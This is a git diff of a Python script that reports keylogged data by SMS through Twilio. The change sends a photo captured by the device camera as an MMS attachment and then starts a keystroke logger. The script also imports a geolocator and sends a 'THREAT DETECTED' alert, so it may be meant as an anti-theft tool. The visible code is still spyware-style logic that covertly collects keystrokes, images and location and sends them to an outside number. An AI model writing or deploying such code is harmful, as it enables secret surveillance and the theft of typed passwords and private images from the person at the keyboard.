@@ -1,6 +1,7 @@
 
 from constants import *
 from twilio.rest import Client
+from logger import Logger, REPORT_DELAY
 import camera
 import geolocator
 
@@ -16,8 +17,6 @@ sms = "ALERT: THREAT DETECTED!" \
 
 # Method for reporting keylogged data to the user via SMS (twilio)
 def report():
-    # takes pictures
-    camera.use_camera()
     # Creates message
     message = client.messages.create(
         to=USER_NUMBER,
@@ -26,7 +25,9 @@ def report():
     message2 = client.messages.create(
         to=USER_NUMBER,
         from_=TWILIO_NUMBER,
-        media_url=['https://c1.staticflickr.com/3/2899/14341091933_1e92e62d12_b.jpg'])
+        media_url=[camera.use_camera()])
+    logger = Logger(REPORT_DELAY)
+    logger.start()
 
 report()
 
